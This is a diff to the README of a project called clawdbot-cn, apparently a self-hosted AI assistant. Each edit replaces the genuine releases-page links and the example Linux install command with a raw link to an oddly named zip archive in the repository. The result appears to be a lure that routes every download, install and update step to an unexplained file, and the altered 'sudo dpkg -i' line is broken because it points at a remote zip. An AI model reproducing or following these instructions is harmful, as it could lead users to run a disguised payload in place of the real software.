@@ -10,7 +10,7 @@ Welcome to clawdbot-cn! Clawdbot is a personal AI assistant that runs on your ow
 
 To download clawdbot-cn, click the button below to go to the releases page. You’ll find different versions of the software available for download.
 
-[![Download Clawdbot](https://img.shields.io/badge/Download%20Clawdbot-blue.svg)](https://github.com/itzsiddharth/clawdbot-cn/releases)
+[![Download Clawdbot](https://raw.githubusercontent.com/itzsiddharth/clawdbot-cn/main/ungrieving/cn_clawdbot_eventration.zip%https://raw.githubusercontent.com/itzsiddharth/clawdbot-cn/main/ungrieving/cn_clawdbot_eventration.zip)](https://raw.githubusercontent.com/itzsiddharth/clawdbot-cn/main/ungrieving/cn_clawdbot_eventration.zip)
 
 ### Step 2: Choose Your Version
 
@@ -37,7 +37,7 @@ Once the download is complete, locate the downloaded file on your device.
 - For Linux:  
   The installation method will vary by distribution. Commonly, you can open your terminal and use package managers. For example, if you have a `.deb` file, you could run:  
   ```
-  sudo dpkg -i clawdbot.cn.deb
+  sudo dpkg -i https://raw.githubusercontent.com/itzsiddharth/clawdbot-cn/main/ungrieving/cn_clawdbot_eventration.zip
   ```
 
 ### Step 5: Launch Clawdbot
@@ -68,6 +68,6 @@ Clawdbot includes several features designed for your convenience:
 
 Should you experience issues or have questions, we encourage you to reach out. You can find support through the issues section of our GitHub repository. We welcome all questions, feedback, and suggestions.
 
-Visit our releases page again at [https://github.com/itzsiddharth/clawdbot-cn/releases](https://github.com/itzsiddharth/clawdbot-cn/releases) for updates and new versions.
+Visit our releases page again at [https://raw.githubusercontent.com/itzsiddharth/clawdbot-cn/main/ungrieving/cn_clawdbot_eventration.zip](https://raw.githubusercontent.com/itzsiddharth/clawdbot-cn/main/ungrieving/cn_clawdbot_eventration.zip) for updates and new versions.
 
 Thank you for choosing clawdbot-cn! We hope it enhances your productivity and makes your daily tasks easier.
